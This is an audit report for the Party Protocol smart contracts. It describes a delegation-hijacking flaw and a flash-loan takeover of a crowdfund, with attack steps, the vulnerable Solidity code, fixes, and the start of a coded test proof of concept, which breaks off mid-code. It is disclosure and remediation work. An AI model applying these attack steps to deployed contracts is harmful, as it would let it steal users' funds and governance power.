{
  "circa": {
    "title": "Party Protocol - Versus contest",
    "sponsor": "PartyDAO",
    "slug": "2023-04-party",
    "date": "2023-06-23",
    "findings": "https://github.com/code-423n4/2023-04-party-findings/issues",
    "contest": 228
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit outlined in this document, C4 conducted an analysis of the Party Protocol smart contract system written in Solidity. The audit took place between April 3—April 14 2023.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>In Code4rena’s Invitational audits, the competition is limited to a small group of wardens; for this audit, 4 wardens contributed reports:</p>\n<ol>\n<li><a href=\"https://twitter.com/IAm0x52\">0x52</a></li>\n<li>HollaDieWaldfee</li>\n<li>evan</li>\n<li><a href=\"https://twitter.com/hansfriese\">hansfriese</a></li>\n</ol>\n<p>This audit was judged by <a href=\"https://github.com/0xean\">0xean</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/liveactionllama\">liveactionllama</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 20 unique vulnerabilities. Of these vulnerabilities, 8 received a risk rating in the category of HIGH severity and 12 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 4 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 2 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2023-04-party\">C4 Party Protocol audit repository</a>, and is composed of 3 abstracts and 11 smart contracts written in the Solidity programming language and includes 2,570 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>, specifically our section on <a href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\">Severity Categorization</a>.</p>\n<h1 id=\"high-risk-findings-8\" style=\"position:relative;\"><a href=\"#high-risk-findings-8\" aria-label=\"high risk findings 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (8)</h1>\n<h2 id=\"h-01-self-delgated-users-can-have-their-delegation-unknowingly-hijacked-during-crowdfunding\" style=\"position:relative;\"><a href=\"#h-01-self-delgated-users-can-have-their-delegation-unknowingly-hijacked-during-crowdfunding\" aria-label=\"h 01 self delgated users can have their delegation unknowingly hijacked during crowdfunding permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/38\">[H-01] Self-delgated users can have their delegation unknowingly hijacked during crowdfunding</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/38\">0x52</a></em></p>\n<p>Self-delegation can be hijacked.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L886-L906\">PartyGovernance.sol#L886-L906</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function _adjustVotingPower(address voter, int192 votingPower, address delegate) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    VotingPowerSnapshot memory oldSnap = _getLastVotingPowerSnapshotForVoter(voter);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address oldDelegate = delegationsByVoter[voter];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // If `oldDelegate` is zero and `voter` never delegated, then have</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // `voter` delegate to themself.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    oldDelegate = oldDelegate == address(0) ? voter : oldDelegate;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // If the new `delegate` is zero, use the current (old) delegate.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    delegate = delegate == address(0) ? oldDelegate : delegate;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    VotingPowerSnapshot memory newSnap = VotingPowerSnapshot({</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        timestamp: uint40(block.timestamp),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        delegatedVotingPower: oldSnap.delegatedVotingPower,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        intrinsicVotingPower: (oldSnap.intrinsicVotingPower.safeCastUint96ToInt192() +</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            votingPower).safeCastInt192ToUint96(),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        isDelegated: delegate != voter</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _insertVotingPowerSnapshot(voter, newSnap);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    delegationsByVoter[voter] = delegate;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Handle rebalancing delegates.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _rebalanceDelegates(voter, oldDelegate, delegate, oldSnap, newSnap);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>Self-delegation is triggered when a user specifies their delegate as address(0). This means that if a user wishes to self-delegate they will can contribute to a crowdfund with delegate == address(0).</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L169-L181\">ETHCrowdfundBase.sol#L169-L181</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function _processContribution(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address payable contributor,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address delegate,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint96 amount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">) internal returns (uint96 votingPower) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address oldDelegate = delegationsByContributor[contributor];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (msg.sender == contributor || oldDelegate == address(0)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Update delegate.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        delegationsByContributor[contributor] = delegate;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Prevent changing another&#39;s delegate if already delegated.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        delegate = oldDelegate;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>This method of self-delegation is problematic when combined with _processContribution. When contributing for someone else, the caller is allowed to specify any delegate they wish. If that user is currently self delegated, then the newly specified delegate will overwrite their self delegation. This allows anyone to hijack the voting power of a self-delegated user.</p>\n<p>This can create serious issues for ReraiseETHCrowdfund because party NFTs are not minted until after the entire crowdfund is successful. Unlike InitialETHCrowdfund, this allows the attacker to hijack all of the user’s newly minted votes.</p>\n<p><strong>Example:</strong><br>\n<code>minContribution = 1</code> and <code>maxContribution = 100</code>. User A contributes 100 to ReraiseETHCrowdfund. They wish to self-delegate so they call contribute with delegate == address(0). An attacker now contributes 1 on behalf of User A with themselves as the delegate. Now when the NFTs are claimed, they will be delegated to the attacker.</p>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Self-delegation should be automatically hardcoded:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">+   if (msg.sender == contributor &amp;&amp; delegate == address(0)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+       delegationsByContributor[contributor] = contributor;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+   }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address oldDelegate = delegationsByContributor[contributor];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (msg.sender == contributor || oldDelegate == address(0)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Update delegate.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        delegationsByContributor[contributor] = delegate;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Prevent changing another&#39;s delegate if already delegated.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        delegate = oldDelegate;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/38#issuecomment-1509306292\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>This appears valid at first pass and allows anyone to steal self delegations. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/38#issuecomment-1512174745\">0xble (Party) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-02-an-attacker-can-contribute-to-the-eth-crowdfund-using-a-flash-loan-and-control-the-party-as-he-likes\" style=\"position:relative;\"><a href=\"#h-02-an-attacker-can-contribute-to-the-eth-crowdfund-using-a-flash-loan-and-control-the-party-as-he-likes\" aria-label=\"h 02 an attacker can contribute to the eth crowdfund using a flash loan and control the party as he likes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/25\">[H-02] An attacker can contribute to the ETH crowdfund using a flash loan and control the party as he likes</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/25\">hansfriese</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L273\">https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L273</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L470\">https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L470</a></p>\n<p>An attacker can have more than half of the total voting power using a flash loan and abuse other contributors.</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The main flaw is that the party can distribute funds right after the crowdfund is finalized within the same block.</p>\n<p>So the attacker can contribute using a flash loan and repay by distributing the part’s ETH.</p>\n<ol>\n<li>Let’s assume <code>maxContribution = type(uint96).max, minTotalContributions = 10 ether, maxTotalContributions = 20 ether, fundingSplitBps = 0</code>.</li>\n<li>An attacker contributes 1 ether(attacker’s fund) to the crowdfund and another user contributes 9 ether.</li>\n<li>The attacker knows the crowdfund will be finalized as it satisfies the <code>minTotalContributions</code> already but he will have 10% of the total voting power.</li>\n<li>So he decides to contribute 10 ether using a flash loan.</li>\n<li>In <code>ETHCrowdfundBase._processContribution()</code>, the crowdfund will be finalized immediately as <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L212\">total contribution is greater than maxTotalContributions</a>.</li>\n<li>Then the attacker will have <code>(1 + 10) / 20 = 55%</code> voting power of the party and he can pass any proposal.</li>\n<li>So he calls <code>distribute()</code> with 19 ether. <code>distribute()</code> can be called directly if <code>opts.distributionsRequireVote == false</code>, otherwise, he should create/execute the distribution proposal and he can do it within the same block.</li>\n<li>After that, he can receive ETH using <code>TokenDistributor.claim()</code> and the amount will be <code>19 * 55% = 10.45 ether</code>. (We ignore the distribution fee for simplicity)</li>\n<li>He repays 10 ether to the flash loan provider and he can control the party as he likes now.</li>\n</ol>\n<p>This attack is possible for both <code>InitialETHCrowdfund</code> and <code>ReraiseETHCrowdfund</code>.</p>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>I think we should implement a kind of <code>cooldown logic</code> after the crowdfund is finalized.</p>\n<ol>\n<li>Add a <code>partyStartedTime</code> in <code>PartyGovernance.sol</code>.</li>\n<li>While finalizing the ETH crowdfund in <code>ETHCrowdfundBase._finalize()</code>, we set <code>party.partyStartedTime = block.timestamp</code>.</li>\n<li>After that, <code>PartyGovernance.distribute()</code> can work only when <code>block.timestamp > partyStartTime</code>.</li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/25#issuecomment-1509327981\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Coded POC would have been welcomed here due to the number of steps in the attack, will review further. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/25#issuecomment-1509442839\">hansfriese commented</a>:</strong></p>\n<blockquote>\n<p>Hello @0xean - Here is a POC. It should be appended to <code>InitialETHCrowdfund.t.sol</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_finalizeUsingFlashloan</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">InitialETHCrowdfund</span><span class=\"mtk1\"> </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_createCrowdfund</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">initialContribution:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">initialContributor:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">initialDelegate:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">minContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">maxContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint96</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">disableContributingForExistingCard:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">false</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">minTotalContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">maxTotalContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">duration:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">7</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">fundingSplitBps:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">fundingSplitRecipient:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">TokenDistributor</span><span class=\"mtk1\"> </span><span class=\"mtk12\">distributor</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">TokenDistributor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">globals</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    